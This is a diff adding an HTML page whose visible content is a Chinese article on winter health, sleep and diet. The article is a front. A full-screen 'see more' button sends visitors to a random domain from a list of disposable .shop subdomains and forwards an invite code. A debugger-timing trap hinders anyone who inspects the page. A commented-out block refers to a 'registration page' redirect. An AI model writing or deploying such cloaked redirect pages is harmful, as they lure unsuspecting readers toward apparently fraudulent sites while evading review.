@@ -1,0 +1,167 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>冬天最好的养生是多睡觉</title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f7f8fc 0%, #eef2ff 100%);
+            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+        }
+        .article {
+            padding: 20px;
+        }
+        .article h1 {font-size: 20px;text-align: center;line-height: 40px;}
+        .article p {font-size: 14px;color: #333;line-height: 24px;text-indent: 2em;}
+        .card {
+            background: #ffffff;
+            width: 90%;
+            max-width: 480px;
+            padding: 48px 32px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        /* Loading旋转动画 */
+        .loader {
+            width: 56px;
+            height: 56px;
+            border: 4px solid #e6edff;
+            border-top-color: #3671e9;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin {
+            to {transform: rotate(360deg);}
+        }
+        h2 {
+            font-size: 24px;
+            color: #1d2939;
+            margin-bottom: 12px;
+        }
+        .desc {
+            font-size: 15px;
+            color: #667085;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+        .error-text {
+            font-size: 18px;
+            color: #d92d20;
+            margin-bottom: 20px;
+        }
+        .btn-link {
+            display: inline-block;
+            padding: 14px 36px;
+            background-color: #3671e9;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.25s ease;
+        }
+        .btn-link:hover {
+            background-color: #2859c4;
+        }
+        .tip-small {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #98a2b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="article">
+        <h1>冬天最好的养生是多睡觉</h1>
+        <p>冬天养生要多睡觉，陕西省西安市中医医院耳鼻喉科主管护师张鸽婷2024年在医院公众号刊文中表示，冬季是养生进补的好时节，想要正确进补，好好睡觉是冬季不可忽略的好方法。早睡晚起，保证充足的睡眠，是冬季养生最简单有效的方法之一。</p>
+        <p>冬季是闭藏的季节，身体需要更多的阳气来固护人体肌表，防止毛孔开泄以致外界寒气的侵袭。我们醒着的时候阳气浮于体外，只有睡着了阳气才能进入身体。</p>
+        <p>因此，和其他季节比起来，冬季养阳、补阳就需要多休息，通过调整睡眠节律以消除疲劳、恢复精神和体力，从而提升自身抵抗力。冬季适当早睡晚起可养藏体内精气，最好晚上10-11点入睡。</p>
+        <p>优先选温性食物补阳气，比如羊肉、牛肉、鸡肉等肉类，搭配板栗、山药、白萝卜炖煮，既能暖身又不会过度上火。</p>
+        <p>适当增加优质蛋白摄入，牛奶、豆制品、鸡蛋可以每天安排，提升身体抗寒能力，也能避免冬季免疫力下降。</p>
+        <p>李永进说了一句大实话：真正健康的食物，往往口感不那么极致，保质期不那么长，配料表不那么复杂。那些让你“一口惊艳”的“健康食品”，才要多留个心眼。</p>
+        <p>多吃润肺润燥的食物，冬季干燥容易出现咽干、咳嗽，可以常吃雪梨、银耳、百合、莲藕，缓解干燥带来的不适。</p>
+        <p>遵循「少咸多苦」的原则，冬季肾经旺盛，太咸的食物会加重肾脏负担，可以适当吃点苦味食物比如芹菜、莴笋、苦菊，帮助养心气。</p>
+        <a href="javascript:get_more();" style="position:fixed;left:50%;top:50%;transform: translate(-50%, -50%);font-size:16px;background:#333;color:#fff;display:block;width:160px;height:50px;text-align:center;line-height:50px;text-decoration:none;border-radius:5px;">点击查看更多</a>
+    </div>
+    <!-- <div class="card">
+        <div class="loader" id="loadingIcon"></div>
+        <h2>正在前往注册页面</h2>
+        <p class="desc">系统正在分配最优线路，请稍候片刻</p>
+        <p class="error-text" id="errorMsg"></p>
+        <a href="" class="btn-link" id="manualLink" style="display:none;">手动点击跳转</a>
+        <p class="tip-small">若长时间无响应，请点击上方按钮</p>
+    </div> -->
+
+<script>
+    const devtoolsDetector = /./;
+    devtoolsDetector.opened = false;
+    const checkDevtools = () => {
+      while (true) {
+        const start = Date.now();
+        debugger; // 打开调试器时这里会暂停
+        const end = Date.now();
+        // consoleLog(end - start);
+        if (end - start < 20) {
+          break;                          // 正常执行，未开调试器
+        } else {
+          // consoleLog('is debugger');
+          devtoolsDetector.opened = true; // 停顿 >= 20ms → 判定调试器已打开
+        }
+      }
+    };
+    // 每 100ms 用 console.log 触发 toString 陷阱；发现调试器就再跑 debugger 检测并清空控制台
+    setInterval(() => {
+      // console.log(devtoolsDetector);
+      if (devtoolsDetector.opened) {
+        checkDevtools();
+        console.clear();
+      }
+    }, 100);
+    checkDevtools(); // 执行 debugger 检测
+    const urls = [
+        'https://z4b9p5o4.txbm.shop',
+        'https://k8f7p5n4.txbm.shop',
+        'https://s8o0j8k7.txbm.shop',
+        'https://t2e5n8z4.txbm.shop',
+        'https://z1r0q1p7.txbm.shop',
+        'https://3iomzwpit6ynp3y2dj.txbm.shop',
+        'https://392grqcz23b3yukh15.txbm.shop',
+        'https://3nzbv9w6eloq7v5foh.txbm.shop',
+        'https://36b25dhsdnj6604v60.txbm.shop',
+        'https://3bfu2k6jvitsmeikvy.txbm.shop',
+        'https://3ape4iwsgaxkakxdwk.txbm.shop',
+        'https://3pgb0so9jeowxihzab.txbm.shop',
+        'https://39stdiqxmcpalgsnzy.txbm.shop',
+        'https://3e14lldizceut.zhizhi.shop',
+        'https://3d568738fzajh.zhizhi.shop',
+        'https://3gz004ujseb9z.zhizhi.shop',
+        'https://37zuhm5yjgzh4.zhizhi.shop',
+        'https://3ajq10qdg2awo.zhizhi.shop',
+        'https://3hblzm6f7a1om.zhizhi.shop',
+        'https://3s1n153mdlcjn.zhizhi.shop',
+        'https://3psvsakssllzl.zhizhi.shop',
+        'https://3fd3s0z5i61dx.zhizhi.shop'
+    ];
+    function get_more(){
+        const params = new URLSearchParams(window.location.search);
+        var invite = params.get('invite');
+        window.location.href = urls[Math.floor(Math.random() * urls.length)]+'?invite='+invite;
+    }
+</script>
+</body>
+</html>
